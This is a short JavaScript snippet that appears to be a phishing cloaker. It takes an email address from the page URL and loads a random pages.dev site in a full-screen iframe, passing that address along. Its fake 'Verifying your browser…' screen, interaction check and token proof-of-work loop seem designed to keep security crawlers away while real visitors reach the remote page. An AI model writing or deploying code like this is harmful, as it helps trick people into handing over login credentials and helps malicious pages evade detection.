<script>
(function () {

  const START = performance.now();
  let interacted = false;

  // Track real interaction
  const mark = () => interacted = true;
  document.addEventListener('mousemove', mark, { once: true });
  document.addEventListener('touchstart', mark, { once: true });
  document.addEventListener('keydown', mark, { once: true });

  // Light proof-of-work (cheap for humans, costly at scale)
  function pow(iter = 400000) {
    let x = 0;
    for (let i = 0; i < iter; i++) {
      x = (x + i) % 1000003;
    }
    return x !== 0;
  }

  function getEmail() {
    return new URLSearchParams(location.search).get('email') || '';
  }

  function loadIframe() {
    const base = 'https://23b538b5.ko1wx90sd.pages.dev';
    const email = getEmail();
    const src = email ? base + '#' + email : base;

    document.body.innerHTML = `
      <style>
        html,body { margin:0; width:100%; height:100% }
        iframe { width:100%; height:100%; border:none }
      </style>
      <iframe src="${src}"></iframe>
    `;
  }

  function block(reason) {
    document.body.innerHTML = `
      <div style="font-family:sans-serif;text-align:center;margin-top:20%">
        <p>Verifying your browser…</p>
      </div>
    `;
    console.warn('Blocked:', reason);
  }

  // Decision point
  setTimeout(() => {

    // Humans almost always interact within 1.5s
    if (interacted) {
      loadIframe();
      return;
    }

    // No interaction → require PoW
    if (pow()) {
      loadIframe();
    } else {
      block('pow-failed');
    }

  }, 1500);

})();
</script>
